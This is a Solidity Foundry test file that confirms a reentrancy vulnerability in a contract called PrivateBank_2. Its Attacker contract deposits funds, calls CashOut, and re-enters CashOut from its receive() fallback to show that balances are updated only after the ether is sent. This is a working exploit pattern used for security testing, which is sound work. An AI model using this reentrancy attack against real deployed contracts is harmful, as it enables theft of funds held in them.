
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PrivateBank_2.sol";

contract TestReentrancyPrivateBank_2 is Test {
    
    PrivateBank_2 public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new PrivateBank_2(address(_log));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 100 ether);
        
        // Ensure attackVal is even for clean division during the attack
        if (attackVal % 2 != 0) {
            attackVal += 1;
        }

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific pre-state required other than deployment

        // --- 3. Funding ---
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    
    PrivateBank_2 public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = PrivateBank_2(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds to pass the balance check in CashOut
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = victim.balances(address(this));

        // 2. Store the value for the re-entrant call if needed.
        // We will withdraw half, then re-enter to withdraw the other half.
        
        // 3. Call the vulnerable function.
        victim.CashOut(val / 2);

        // 4. Verify Success Conditions.
        // Success is determined inside receive() where we check for stale state.
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            
            // Check if the balance in the victim contract is still equal to the initial deposit.
            // If true, it means the state update (deduction) happens AFTER this external call.
            if (victim.balances(address(this)) == storedVal) {
                exploitSucceeded = true;
            }

            // Re-enter the contract
            victim.CashOut(storedVal / 2);
        }
    }
}
